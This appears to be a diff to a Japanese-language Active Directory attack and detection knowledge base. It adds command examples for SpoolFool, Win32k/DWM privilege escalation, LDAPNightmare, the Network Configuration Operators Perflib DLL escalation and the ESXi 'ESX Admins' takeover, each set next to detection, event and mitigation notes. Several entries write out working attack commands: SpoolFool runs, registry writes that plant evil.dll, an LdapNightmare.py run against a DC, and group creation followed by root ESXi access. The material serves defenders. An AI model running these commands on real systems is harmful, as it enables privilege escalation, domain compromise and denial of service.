+        "tool": "SpoolFool",
+        "t": "既定ペイロードでローカル管理者を作成。`-dll`のDLLパスとプリンタドライバディレクトリへの書込みが検知の核",
+        "q": "SpoolFool.exe -dll add_user.dll"
+      },
+      {
+        "tool": "SpoolFool",
+        "t": "対象プリンタとSpoolDirectory配置先を明示指定する版。レジストリのSpoolDirectory値変更と組み合わせて追う",
+        "q": "SpoolFool.exe -dll add_user.dll -printer 'Microsoft XPS Document Writer' -dir 'SECRET'"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "悪用の前段。プリンタのSpoolDirectory値を攻撃者制御パスへ書換える操作そのものが一次シグナル",
+        "q": "reg.exe add \"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Print\\\\Printers\\\\Microsoft XPS Document Writer\" /v SpoolDirectory /t REG_SZ /d C:\\\\Windows\\\\Temp\\\\SpoolFool /f"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ適用確認。Win10 20H2/21H1/21H2系はKB5010342、1809/Server2019系はKB5010351の適用有無を照合",
+        "q": "Get-HotFix -Id KB5010342"
+      },
+      {
+        "tool": "icacls",
+        "t": "world-writable化したドライバディレクトリの事後検知。EveryoneへのFullControl DACL付与を確認",
+        "q": "icacls C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\x64\\\\4"
+      },
+      {
+        "tool": "Metasploit",
+        "t": "MSFの実装モジュール名。SMBセッション経由のDLL投下と組み合わせて相関させる",
+        "q": "use exploit/windows/local/cve_2022_21999_spoolfool_privesc"
+      }
+    ],
     "detect": "スプーラ周りの相関が勘所: (a) 低権限プロセスによる `...\\Control\\Print\\Printers\\<name>\\SpoolDirectory` レジストリ値の非既定/UNC パスへの書換、および同プリンタ配下 `CopyFiles\\...\\Module` 値への DLL パス設定(Sysmon EID13 / DeviceRegistryEvents), (b) `C:\\Windows\\System32\\spool\\drivers\\x64\\`(例 `\\4\\` 配下)への非標準・非署名 DLL 作成と、spoolsv.exe による当該 DLL のロード(Sysmon EID11/7, DeviceFileEvents/DeviceImageLoadEvents), (c) 直後の SYSTEM(spoolsv 起点)によるローカル管理者アカウント作成とローカル Administrators への追加(4720＋4732)。加えて Print Spooler サービスの異常終了→自動復旧(7031/7034/7036)や `System32\\spool\\drivers` 配下でのジャンクション/リパースポイント作成を監視する。既定手口では正規 DLL `AppVTerminator.dll` が CopyFiles モジュールとしてロードされスプーラ再起動の踏み台になる点も一助。Microsoft-Windows-PrintService/Operational・Admin のドライバ/CopyFiles 操作イベントも併読する(印刷プロセッサ登録 AddPrintProcessor はこの手口では使われない)。",
     "events": "Sysmon 13(SpoolDirectory・CopyFiles\\Module レジストリ値設定)/11(`drivers\\x64` への DLL 作成・`spool\\drivers` 配下ジャンクション)/7(spoolsv.exe の非標準 DLL ロード)/1(SpoolFool.exe 実行・spooler 再起動), 4657(レジストリ値変更 ※オブジェクト監査有効時), 7031/7034/7036(Print Spooler サービスの異常終了/自動復旧), 4720＋4732(ローカル Administrators へのメンバ追加=既定ペイロードの後条件。4728 は対象がドメイングローバルグループの場合のみ), Microsoft-Windows-PrintService/Operational・Admin(ドライバ/CopyFiles 操作)",
     "mitigate": "2022年2月の累積更新(CVE-2022-21999 修正: 例 KB5010342/KB5010351 系)の適用が本質的対策。業務上不要なサーバ/DC では Print Spooler サービスを停止・無効化する。防御多層として `...\\spool\\drivers\\x64\\`(および `prtprocs\\x64\\`)への書込監視、`SpoolDirectory`・`CopyFiles\\Module` レジストリ変更の監査、非管理者によるスプーラ再起動/異常終了の検知を有効化する。RestrictDriverInstallationToAdministrators 等の Point-and-Print 厳格化は PrintNightmare 系と共通の多層防御(本 LPE 自体は封じないが横展開/ドライバ悪用の足場を狭める)。EDR で spoolsv.exe の非標準パス DLL ロードと SYSTEM 起点のローカル管理者作成をアラート化する。",
@@ -10712,6 +17428,28 @@ AD.I18N.ja.attacks = [
     "summary": "Win32k GUIカーネルサブシステム(win32kfull.sys/win32kbase.sys)のウィンドウ/DCオブジェクト処理におけるUAF・競合でカーネルオブジェクトを破壊し自プロセスの_EPROCESSトークンをSYSTEMへ上書きしてローカル権限昇格する系統と、DWM Core(dwmcore.dll。カーネルではなくSystem整合性で動くユーザーモードのdwm.exeにロードされるコアライブラリ)のヒープ境界外書き込みでdwm.exeを乗っ取りSystem整合性コード実行を得る系統を束ねた、Windowsグラフィックスサブシステムのローカル特権昇格。Win32kとDesktop Window Managerは常時ITW悪用が続く定番のローカルSYSTEM攻撃面で、CVE-2025-24983(Win32k UAF、PipeMagic経由、ESET報告)、CVE-2024-30051(DWM Coreヒープオーバーフロー、QakBot経由、Kaspersky報告)、CVE-2023-29336(Win32k UAF、Avast/DBAPPSecurity報告のITWゼロデイ)が代表例。コモディティ/ランサムの初期侵入直後に踏むSYSTEM昇格ステップとして反復利用される。",
     "how": "前提: 低〜中Integrityで任意コード実行可能なローカルプロセス(多くは初期侵入マルウェアのプロセス内)。Windowsグラフィックスサブシステムの2系統の欠陥を悪用する。(1) Win32k系(win32kfull.sys/win32kbase.sys、カーネルモード): ウィンドウ/デバイスコンテキスト(DC)オブジェクトのハンドル処理におけるUse-After-Free/競合状態を突く。CVE-2025-24983はWaitForInputIdle API経由でW32PROCESS構造体が本来より1回多く参照解除されUAF化する競合バグ(悪用にはレースの勝利が必要)、CVE-2023-29336もWin32kのUAF。解放済みカーネルオブジェクトを攻撃者制御データで再確保してカーネルメモリを破壊し、任意カーネル読み書きプリミティブを構築、最終的に自プロセスの_EPROCESSのToken(_TOKEN)をSYSTEM(PID 4/System)のトークンへ上書き(token stealing)して昇格する。(2) DWM Core系(dwmcore.dll): これはカーネルドライバではなく、System整合性で動作するユーザーモードのDesktop Window Manager(dwm.exe)にロードされるコアライブラリ。CVE-2024-30051はCCommandBuffer::Initializeの整数除算のサイズ誤計算に起因するヒープ境界外書き込みで、攻撃者はdwm.exeプロセスのヒープをヒープスプレーで整地したうえでオーバーフローを誘発し、細工DLLをロードさせてDWMアカウント(System整合性)権限で任意コードを実行する(カーネルヒープ破壊やEPROCESSトークン上書きではない点に注意)。いずれの系統も最終的にSYSTEM相当権限を獲得し、昇格後は同プロセスまたは新規子プロセスがSYSTEM(IntegrityLevel=System)で走り、LSASSダンプ・サービス作成・横展開へ連鎖する。実運用ではコモディティ/ランサムのローダが初期侵入(PipeMagic→CVE-2025-24983、QakBot→CVE-2024-30051)を担い、本技法はその直後のSYSTEM昇格ステップとして使われる。バグ悪用は正規Win32k/DWM APIコールの範囲で完結するため固有のWindowsセキュリティイベントを残しにくく、痕跡は昇格後のトークン異常・SYSTEM子プロセス・悪用失敗時のクラッシュ(Win32k系はカーネルBugcheck/BSOD、DWM系はdwm.exeのユーザーモードクラッシュ)に現れる。",
     "tools": "公開エクスプロイトPoC(CVE-2023-29336/CVE-2024-30051/CVE-2025-24983、GitHub/Fortra等), PipeMagic(CVE-2025-24983デリバリ用バックドア/ローダ、ESET観測), QakBot/Qbot(CVE-2024-30051デリバリ), Cobalt Strike / Metasploit(post-ex・GetSystem系SYSTEMシェル), 汎用Win32k/GDIカーネルエクスプロイトフレームワーク",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "CVE-2023-29336/2025-24983はWin32kカーネルUAFで公開PoCにCLI文書化なし。悪用失敗時のカーネルBugcheckをEventID41で追う",
+        "q": "Get-WinEvent -LogName System -FilterXPath \"*[System[(EventID=41)]]\""
+      },
+      {
+        "tool": "PowerShell",
+        "t": "CVE-2024-30051はdwmcore.dllのユーザーモードヒープ破壊。悪用失敗時はdwm.exeがクラッシュしEventID1000のApplication Errorを残す",
+        "q": "Get-WinEvent -LogName Application -FilterXPath \"*[System[(EventID=1000)] and EventData[Data='dwm.exe']]\""
+      },
+      {
+        "tool": "CVE-2024-30051",
+        "t": "公開PoC(fortra)は実行可能バイナリとして配布されるがCLI引数は文書化されておらず、実行ファイル名自体が唯一のプロセス名シグナル",
+        "q": "CVE-2024-30051.exe"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "個別KB番号が非公開のCVEを含むため、各月例更新(2023-05/2024-05/2025-03)適用日以降のHotFixで代替判定",
+        "q": "Get-HotFix | Where-Object {$_.InstalledOn -ge '2025-03-11'} | Select-Object HotFixID,InstalledOn"
+      }
+    ],
     "detect": "本技法に固有の専用セキュリティイベントは存在せず、検知はEDRの挙動ベースが中心。勘所: (1) 中/低IntegrityLevelの非サービスプロセス(ブラウザ・Office・未署名ローダ)が、正規昇格経路(UAC consent.exe/サービス制御)を経ずにSYSTEMトークン/System整合性を獲得し、そのままSYSTEM子プロセス(cmd/powershell/rundll32)を生成する“トークンジャンプ”(MDE DeviceProcessEventsのProcessIntegrityLevel/InitiatingProcessIntegrityLevel、Sysmon EID1のIntegrityLevel、4688のTokenElevationType)。(2) 悪用失敗時のクラッシュ: DWM Core系はユーザーモードのdwm.exeクラッシュ=Windows Error Reporting(Application 1001、faulting module=dwmcore.dll、または dwm.exe/csrss.exeの異常終了)、Win32k系はカーネルクラッシュ=System Bugcheck/BSOD(faulting driver=win32kfull.sys/win32kbase.sys)。(3) EDRのカーネルエクスプロイト緩和(Defender Exploit Guard/Falcon Exploitation Prevention)の発火。初期侵入ローダ(PipeMagic/QakBot)の直後にSYSTEM昇格が続く時系列相関が決定的。",
     "events": "専用イベント無し(EoPはカーネル内/DWMプロセス内で完結)。相関に使うもの: Sysmon 1(IntegrityLevel=System・親子整合性), 4688(新規プロセス+TokenElevationType %%1936), 4672(SYSTEMへの特権割当), Windows Error Reporting=Application 1001(ユーザーモードクラッシュ、faulting module=dwmcore.dll/dwm.exe/csrss.exe), System 1001/Bugcheck(Win32kカーネルクラッシュのBSOD、win32kfull.sys/win32kbase.sys), MDE DeviceProcessEvents(ProcessIntegrityLevel/ProcessTokenElevation)",
     "mitigate": "該当累積更新の適用が最優先: CVE-2023-29336=2023年5月、CVE-2024-30051=2024年5月、CVE-2025-24983=2025年3月のパッチ。露出プロセス(ブラウザ/レンダラ/ドキュメントビューア)にWin32kシステムコールフィルタ(ProcessSystemCallDisablePolicy/『Win32k system callの無効化』)を適用しWin32k攻撃面を遮断する(Edge/Chromeは既定で採用)。HVCI(メモリ整合性)/Kernel Data Protection(KDP)とVBSを有効化しWin32k系のカーネルオブジェクト改ざんを緩和(DWM Coreはユーザーモードのため主にパッチとWin32kフィルタ・EDRで対処)。Defender Exploit GuardのASRと脆弱ドライバブロックを併用。EoPは二次ステップのため、初期侵入(PipeMagic/QakBot等のローダ)を初動で遮断することが実効的な緩和になる。一般ユーザ権限の最小化と、SYSTEM昇格後に多用されるLSASSアクセス(Sysmon EID10)・サービス作成(7045)の監視で被害を局限する。",
@@ -10752,6 +17490,33 @@ AD.I18N.ja.attacks = [
     "summary": "Windows LDAPクライアント(wldap32.dll)のCLDAP参照(referral)応答処理に存在する整数境界外読み取りを突く。攻撃者は細工したNetlogon RPC(DsrGetDcNameEx2などのDCロケータ要求)でDCを攻撃者ドメインへのDNS SRV解決→外向きCLDAP問い合わせへ誘導し、応答のlm_referral値を非0にした悪意ある参照応答を返してlsass.exeをクラッシュさせ、DCを再起動ループに陥れる未認証DoS(CVE-2024-49113 = LDAPNightmare)。姉妹CVEのCVE-2024-49112(通称LDAPBleed, CVSS9.8)は同じ参照処理経路をCLDAPパケット改変で悪用しLDAPサービスコンテキストのRCEに至り得るが、SafeBreach公開PoCが実証しているのはDoS(49113)のみでRCEの公開PoCは存在しない。対象はDCに限らずwldap32 LDAPクライアントを持つ未パッチWindows Server全般だが、認証不要でネットワーク到達性のみで最重要ホストであるDCを不安定化でき、緊急パッチ・検知対象。",
     "how": "攻撃者は被害DCへNetlogon RPC(具体的にはDsrGetDcNameEx2などのDCロケータ要求)をDCE/RPC上で送り、DCに攻撃者が指定したドメインのDCロケータ処理を実行させる。DCはまずDNSで _ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.<attacker> / _ldap._tcp.dc._msdcs.<attacker> といったSRVレコードを問い合わせ、解決先に対しCLDAP(コネクションレスLDAP, UDP/389)のNetlogonロケータ要求を送信する(DC Locatorメカニズムを外向きに誘導)。攻撃者はそのCLDAP要求に悪意ある参照(referral)応答を返し、応答の長さフィールドを細工してlm_referral値を非0にする。DC側wldap32.dllのLdapChaseReferral()がこの参照応答を処理する際、不正なlm_referralオフセットで無効/NULLの参照テーブルポインタを参照し、整数境界外読み取り(integer OOB read)によるアクセス違反が発生する。CVE-2024-49113ではこれがlsass.exe内で未処理例外を誘発してlsassを終了させ、lsassは重要プロセスのためWindowsがバグチェック(CRITICAL_PROCESS_DIED, 0xEF)→自動再起動し、応答を送り続ければDCを再起動ループに陥れる(DoS)。CVE-2024-49112では同じ経路をCLDAPパケットの改変で悪用しLDAPサービス(DC上はlsass)コンテキストのコード実行に至り得る(CVSS9.8)が、公開されているのはDoSのPoCのみでRCEの実証コードは未公開である。前提はDCへのRPC到達性と、被害DCのDNSサーバが攻撃者ドメインを解決できるegress(SafeBreach PoCは被害DCのDNSがインターネット到達可能であることのみを前提)であり、認証は一切不要。本脆弱性はDCに限らずwldap32 LDAPクライアントを持つ未パッチWindows Server全般が対象だが、DCが最重要標的。本DoSはDC上で悪意あるバイナリを起動しない点が特徴で、可視化はネットワーク挙動とlsassクラッシュ/再起動に限られる。",
     "tools": "SafeBreach LDAPNightmare PoC (github.com/SafeBreach-Labs/CVE-2024-49113: 悪性CLDAP参照サーバ+DsrGetDcNameEx2 RPCトリガ, DoS実証), 独自CLDAP referralサーバ(rogue CLDAP responder), Impacket(DCE/RPC・CLDAP応答の細工), nltest(DC Locator/dsgetdc動作トリガ), Wireshark(CLDAP/SRVトラフィック検証)",
+    "cmd": [
+      {
+        "tool": "LDAPNightmare",
+        "t": "SafeBreach公開PoC。標的DCへCLDAP参照応答を返し未認証でlsass.exeをクラッシュさせる。`--domain-name`が攻撃者ドメイン指定",
+        "q": "python LdapNightmare.py 10.0.0.10 --domain-name attacker-controlled.com"
+      },
+      {
+        "tool": "LDAPNightmare",
+        "t": "リッスンポート・対象アカウントを個別指定する詳細版。既定389以外へ変更された場合の検知網羅にはポート引数の把握が必須",
+        "q": "python LdapNightmare.py 10.0.0.10 --domain-name attacker-controlled.com --listen-port 389 --account Administrator"
+      },
+      {
+        "tool": "nltest.exe",
+        "t": "DC Locator処理を明示的にトリガする正規LOLBin。悪用前提の外向きCLDAP問い合わせを人為的に誘発でき検証にも使われる",
+        "q": "nltest.exe /dsgetdc:corp.local /gc"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ適用確認の代替。2024年12月Patch Tuesday適用日以降のHotFix有無で判定(個別KB非公開)",
+        "q": "Get-HotFix | Where-Object {$_.InstalledOn -ge '2024-12-10'} | Select-Object HotFixID,InstalledOn"
+      },
+      {
+        "tool": "tshark",
+        "t": "端末プロセスに痕跡が残らないネットワーク攻撃のため、異常な外向きCLDAP(UDP/389)とSRVレコード問い合わせをパケットキャプチャで追う",
+        "q": "tshark -f \"udp port 389\" -Y \"cldap\" -i any"
+      }
+    ],
     "detect": "検知の主眼はDC側のネットワークとクラッシュ挙動であり、DC上のプロセス系テレメトリではない(本DoSは悪性プロセスを起動しないためEDRのプロセス検知は空振りしやすい)。正常時のDCのCLDAP(UDP/389)は既知DC・信頼フォレスト間に限られるため、DCから非DC・外部IPへのアウトバウンドUDP/389や、自/既知ドメイン以外への _ldap._tcp.…dc._msdcs.<外部> SRVクエリ(Sysmon EID22)が強い異常シグナル。Application Error 1000でlsass.exeが faulting module wldap32.dll(LdapChaseReferralでのアクセス違反)としてクラッシュし、直後にKernel-Power 41/System 6008でDCが予期せず再起動、これが短時間に反復すればDoS成立を示す。DCへのインバウンドDCE/RPC(ロケータ要求)自体はノイズが多く単独では弱いので、SRV解決→外部CLDAP誘導→lsassクラッシュ→DC再起動の時系列相関で判定する。SIEMではネットワーク(UDP389 egress)・クラッシュ(1000/wldap32)・再起動(41/6008)の3系統を同一DC・近接時刻で束ねるのが要点。",
     "events": "Application Error 1000(lsass.exeクラッシュ, faulting module wldap32.dll / LdapChaseReferralのアクセス違反), Windows Error Reporting 1001(lsassのWERレポート)/ Bugcheck 1001(CRITICAL_PROCESS_DIED 0xEF), System 6008(予期しないシャットダウン)/1074/Kernel-Power 41(63)(DC再起動) ※lsassは重要プロセスのためOSがバグチェック→再起動する経路が主で、SCM 7031/7034(サービス異常終了)は必ずしも記録されない, Sysmon 22(DnsQuery: DC発の _ldap._tcp.…_msdcs SRVで異常宛先ドメイン)/Sysmon 3(UDP389 CLDAPアウトバウンド); ※本DoSはDC上でプロセス実行を伴わず専用のSecurity監査IDは存在しない",
     "mitigate": "2024年12月のセキュリティ更新(CVE-2024-49112/49113の修正)を全DCおよびwldap32クライアントを持つWindows Serverへ最優先で適用する。ネットワーク境界でDCの外向きCLDAP/DNSを制限し、DCが非DC・外部・半信頼ネットワークへUDP389(CLDAP)や任意ドメインの _ldap._tcp SRV解決を行えないようファイアウォール/セグメンテーションで封じる(被害DCのDNSがインターネット到達可能である前提を崩す)。DCへのインバウンドDCE/RPC(135/エフェメラル)を管理系からのみに絞り、信頼できないセグメントからのRPC到達を遮断する。DCから非内部ドメインへのSRVクエリや外部IPへのCLDAP、lsassの反復クラッシュ/予期しない再起動をアラート化して早期に封じ込める。重要プロセス保護によりlsass終了=DC再起動となるため、ダウンタイム影響を踏まえパッチ適用までは露出面(DCのCLDAP/DNS egress)を最小化する。",
@@ -10797,6 +17562,33 @@ AD.I18N.ja.attacks = [
     "summary": "組込みの委任グループNetwork Configuration Operators(NCO)のメンバーが、DnsCache/NetBTサービスのレジストリキーに持つ過剰なSetValue/CreateSubKey権限を悪用し、Performanceサブキー経由で悪性Perflib DLLを登録する昇格経路。SYSTEMで動作するWMI性能カウンタプロバイダ(WmiPrvSE.exe)が当該カウンタを照会すると、登録DLLがSYSTEMとしてロード・実行され、一見低権限の委任グループからSYSTEM、DC上ではドメイン侵害に直結する。CVE-2025-21293として2025年1月14日に修正(NCOのSetValue権限を除去)。研究/PoCはReTest SecurityのSebastian Birke、Perflib武器化はClément Labroの先行研究に基づく。",
     "how": "前提はドメインまたはローカルのNetwork Configuration Operators(NCO, BUILTIN RID S-1-5-32-556)グループのメンバーシップのみで、管理者権限は不要。修正前のWindowsではNCOグループにHKLM\\SYSTEM\\CurrentControlSet\\Services配下のネットワークサービスキー(公開研究ではDnscache/DNS Client と NetBT の2キーが確認済み)へのCreateSubKey/SetValueという過剰な権限が付与されていた。攻撃者はこの権限で対象サービスキー配下にPerformanceサブキーを新規作成し、Library値に攻撃者制御の悪性Perflib DLL(UNC共有やユーザ書込可能ローカルパス)、Open/Collect/Close値に当該DLLのエクスポート関数名を書き込む(恣意的なサブキーではなく、この専用のPerformanceサブキーとLibrary/Open/Collect/Close 4値の設定が悪用の実体)。Windowsの性能カウンタ機構(Perflib)は、性能データ消費側がカウンタを列挙・照会する際、各サービスのPerformance\\Library DLLを消費側プロセスのコンテキストでロードしOpen→Collect→Closeを呼び出す。ここでSYSTEMで動作するWMIの性能カウンタプロバイダ(WmiPrvSE.exe)がWin32_PerfRawData_*/Win32_PerfFormattedData_*クラスを照会すると、登録済みの悪性DLLがSYSTEM権限でロード・実行される(T1047 WMIがロードのトリガ、書込可能サービスレジストリのPerflibサブキー悪用がT1574.011=Services Registry Permissions Weaknessの実プリミティブ)。PoCではこのSYSTEMコンテキストの性能カウンタ照会を誘発し、DLLのエントリ内で任意コードをSYSTEMで実行する。NCOはDC上でも組込みドメインローカルグループとして存在するため、DCでSYSTEMを得ればドメイン全体の掌握に直結する。2025年1月14日の修正はこの過剰権限のうちSetValue(値書込)をNCOから除去したもので、パッチ適用済みホストではNCOメンバー単独では当該サービスキーにLibrary等の値を書き込めず、悪性DLLを登録できない。",
     "tools": "CVE-2025-21293 PoC (ReTest Security ApS / Sebastian Birke〈birkep〉公開; Perflibカウンタ武器化の先行研究はClément Labro/itm4n), reg.exe / New-ItemProperty(Performanceサブキー登録), 自作Perflib DLL(Open/Collect/Close エクスポート), WMI (Get-CimInstance/wmic Win32_PerfRawData_*), typeperf, lodctr, PowerShell",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "NCOが保持するDnscache/NetBTサービスキーへのSetValue権でPerformanceサブキーとLibrary/Open/Collect/Closeの4値を登録。修正済みDCではSetValueが除去されこの書込自体が失敗する",
+        "q": "reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Performance /v Library /t REG_SZ /d C:\\Windows\\Temp\\evil.dll /f\nreg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Performance /v Open /t REG_SZ /d OpenPerfData /f\nreg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Performance /v Collect /t REG_SZ /d CollectPerfData /f\nreg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Performance /v Close /t REG_SZ /d ClosePerfData /f"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "PowerShellモジュールログでの同一操作。4104に`Performance`サブキーと`Library`値名が残りreg.exeを使わない亜種の検知を補完する",
+        "q": "New-Item -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Performance' -Force\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Performance' -Name Library -Value 'C:\\Windows\\Temp\\evil.dll' -PropertyType String -Force"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "WMIの性能カウンタプロバイダへ任意の性能クラスを照会すると登録済み全Perflib DLLがSYSTEMのWmiPrvSE.exeへロードされる。クエリ自体は無害でも直後の不審DLLロードと相関させる",
+        "q": "Get-CimInstance -ClassName Win32_PerfRawData_PerfOS_Memory"
+      },
+      {
+        "tool": "wmic.exe",
+        "t": "非推奨のwmic.exeでも同じ照会が成立し同様にPerflib全体をロードさせる代替トリガ。wmic.exe自体が近年では希少な実行としてLOLBin単体でも要注意",
+        "q": "wmic.exe path Win32_PerfRawData_PerfOS_Memory get Name"
+      },
+      {
+        "tool": "lodctr.exe",
+        "t": "カウンタ定義の再構築コマンドが登録直後のPerflib再走査を誘発する代替トリガ。`/R`単独の実行は稀に正規運用でも見られるため直前のreg書込との相関が必須",
+        "q": "lodctr.exe /R"
+      }
+    ],
     "detect": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ネットワークサービス>\\Performance サブキーの新規作成とLibrary/Open/Collect/Close値の設定を監視する(要レジストリSACL)。WmiPrvSE.exe(SYSTEM)がSystem32/WinSxS外の非標準・非署名DLLをロードする事象(Sysmon 7 / DeviceImageLoadEvents)と、その直後の異常な子プロセス生成を相関する。NCOグループ(RID 556)のメンバー追加(4732)や、非管理アカウントによるServicesキー書込を突き合わせる。",
     "events": "4657 (レジストリ値の変更; 要SACL), 4656/4663 (Servicesキーへのオブジェクトアクセス), Sysmon 13 (RegistryValueSet: ...\\Performance\\Library 等), Sysmon 7 (WmiPrvSE.exe の非標準DLLロード), 4688 / Sysmon 1 (WmiPrvSE.exe の異常子プロセス), 4732 (BUILTIN\\Network Configuration Operators RID 556 へのメンバー追加; セキュリティ有効ローカルグループ)",
     "mitigate": "最優先で2025年1月の累積更新(CVE-2025-21293対策)を全Windows/DCに適用し、NCOグループのServicesレジストリキーへのSetValue(値書込)権限が除去された状態を確認する。Network Configuration Operatorsのメンバーを最小化/空にし、DCではTier0として扱う。Services配下(特に...\\Performance\\Library)にレジストリSACLを設定し、非管理アカウントによるCreateSubKey/SetValueを監査・禁止する。lodctr /R でカウンタ整合性を確認し、想定外のPerflib Library登録を棚卸しする。",
@@ -10842,6 +17634,38 @@ AD.I18N.ja.attacks = [
     "summary": "ADに参加したVMware ESXiホストは、既定で『ESX Admins』という名前のドメイングループの全メンバーへフル管理者(root相当)権限を自動付与する。この認可はグループのSIDではなく名前文字列で解決され、ドメイン参加時点で当該グループが存在しなくても、後から同名グループを作成/改名すれば次回認証時にマッピングが再生成される。グループの作成または改名権限を持つ攻撃者は瞬時に全ハイパーバイザを掌握し、SSH/vSphereでrootログインしてデータストア上の全ゲストVMを一括暗号化・窃取できる。Storm-0506(Black Bastaランサム展開)、Octo Tempest、Storm-1175、Manatee Tempestが実運用で悪用し、AkiraやBlack Bastaの展開に至った。NVD/NIST基本値は7.2(High)、Broadcom算定は6.8(Medium)だが、影響はハイパーバイザ全面掌握で運用上Criticalとして扱う。",
     "how": "前提はESXiホストがAD参加済み(vSphere Authentication Proxy/Likewise/netdom joinのいずれか)で、攻撃者がADで新規グループ作成または既存グループの改名(sAMAccountName/CNへの書き込み)権限を保持すること。ESXiのAdvanced Setting `Config.HostAgent.plugins.hostsvc.esxAdminsGroup` が既定値『ESX Admins』を指し、`...esxAdminsGroupAutoAdd` により同名グループのメンバーへAdministratorロールを自動付与する。脆弱性の核心は、この照合がグループのSIDではなく名前文字列で行われ、かつドメイン参加時点でグループが不在でも次回認証時にマッピングを再生成・再付与する点にある。Microsoftが挙げる悪用経路は3つ: (1)『ESX Admins』グループを新規作成し自アカウントを追加、(2)既存グループを『ESX Admins』へ改名、(3)管理者が別グループへ切り替えてもホスト側で権限が即時失効しない“権限リフレッシュ”の遅延を突く。攻撃者は `New-ADGroup 'ESX Admins'` / `Rename-ADObject` / `Add-ADGroupMember`(または `net group` / `dsadd group`)を実行し、次の認証でESXiが自身をフル管理者と認識する。以後、SSH(22/TCP)またはESXi Shell/vSphere Web UIでrootとしてログインし、`vim-cmd vmsvc/getallvms` でゲスト列挙、`vim-cmd vmsvc/power.off` で全VM停止、`/vmfs/volumes` 配下のVMDKへランサムウェアバイナリを配置して一括暗号化する。実際にはBlack Basta/Akira(その他Babuk/LockBit/Kuiper等のLinux・ESXi向けランサム)が投入され、単一のグループ操作で全仮想基盤が人質化する。パッチ適用後も esxAdminsGroup が既定名のままだと同種のグループ名占取リスクが残るため、既定名の変更が必須である。",
     "tools": "PowerShell RSAT (New-ADGroup, Rename-ADObject, Add-ADGroupMember), net.exe group, dsadd/dsmod group, SSHクライアント, ESXi Shell / vim-cmd / esxcli, vSphere・ESXi Web Client, Black Basta/Akira/LockBit(ESXi向けランサムウェア)",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "『ESX Admins』グループを新規作成し自アカウントを追加。グループ名一致だけで次回認証時にフルAdministrator化する",
+        "q": "New-ADGroup -Name 'ESX Admins' -GroupScope Global -Path 'OU=Groups,DC=corp,DC=local'; Add-ADGroupMember -Identity 'ESX Admins' -Members svc_user"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "既存グループの改名による悪用。`Rename-ADObject`のオブジェクト名変更がAD側の一次シグナル",
+        "q": "Rename-ADObject -Identity 'CN=OldGroupName,OU=Groups,DC=corp,DC=local' -NewName 'ESX Admins'"
+      },
+      {
+        "tool": "net.exe",
+        "t": "GUI/RSATを使わないLOLBin版のグループ作成・追加。`net group /add`と`/domain`の組合せが定番シグナル",
+        "q": "net group \"ESX Admins\" /add /domain"
+      },
+      {
+        "tool": "PowerCLI",
+        "t": "defender側の設定検証。esxAdminsGroupが既定値'ESX Admins'のままかをESXi Advanced Settingで確認",
+        "q": "Get-VMHost esxi01.corp.local | Get-AdvancedSetting -Name Config.HostAgent.plugins.hostsvc.esxAdminsGroup"
+      },
+      {
+        "tool": "ssh",
+        "t": "権限奪取後の実行。rootとしてのSSHログイン成功自体が異常侵害の決定的シグナル(ADグループ変更の直後に多発)",
+        "q": "ssh root@esxi01.corp.local"
+      },
+      {
+        "tool": "vim-cmd",
+        "t": "奪取したroot権限で全ゲストVMを列挙・停止しランサム展開する定番後続。`vmsvc/getallvms`からの一括`power.off`が破壊活動の起点",
+        "q": "vim-cmd vmsvc/getallvms"
+      }
+    ],
     "detect": "検知の主戦場はAD側で、『ESX Admins』という名前のセキュリティグループの新規作成(4727/4731/4754)、改名(4737/4735/4755のsAMAccountName・名前変更)、メンバー追加(4728/4732/4756)を最優先で監視する。TargetUserNameが『ESX Admins』のこれらのイベントは正規運用では極めて稀で、単独でも高信頼シグナルとなる。ESXi側はhostd.log/auth.log/shell.logを外部SIEMへSyslog転送し、rootの直接SSHログイン(通常のvpxuser経由でない)、`vim-cmd`/`esxcli`による大量VMのpower off・データストア操作、短時間での大量VMDK改変を相関する。vCenterの権限変更や異常なホスト直接ログインも併せて監視する。ESXiハイパーバイザにはEDRセンサーが載らないためホスト実行テレメトリは限定的で、AD監査ログとESXi syslogの突き合わせが要となる。",
     "events": "4727/4731/4754(セキュリティグループ作成: 全域/ローカル/ユニバーサル), 4737/4735/4755(グループ変更・改名), 4728/4732/4756(グループへメンバー追加), 4662/4670(オブジェクト権限変更) ※ESXi側はWindows Event IDではなくSyslog(hostd.log/auth.log/shell.log)を転送。vCenterの権限付与・ホスト直接ログインイベントも相関対象",
     "mitigate": "Broadcom VMSA-2024-0013のパッチ適用(ESXi 8.0 U3 / ESXi80U3-24022510以降)を最優先。ESXi 7.0系はパッチ提供予定がないためワークアラウンド必須で、`Config.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd` を false にして自動付与を無効化し、`esxAdminsGroup` を『ESX Admins』以外の一意で作成困難な専用グループへ変更、`Config.HostAgent.plugins.vimsvc.authValidateInterval` を短縮してAD側の権限変更を早く反映させる。可能ならESXi管理をAD集中認証から切り離し、ローカル/専用管理アカウントとMFA・限定的SSHへ移行する。ADで『ESX Admins』グループの作成/改名を検知するSIEMルールとカナリア(同名グループのハニー化)を設置し、グループ作成・改名権限の委任を棚卸しして最小化する。ESXi管理ネットワークを分離し、SSH無効化・Lockdownモードを徹底する。",
@@ -10887,6 +17711,38 @@ AD.I18N.ja.attacks = [
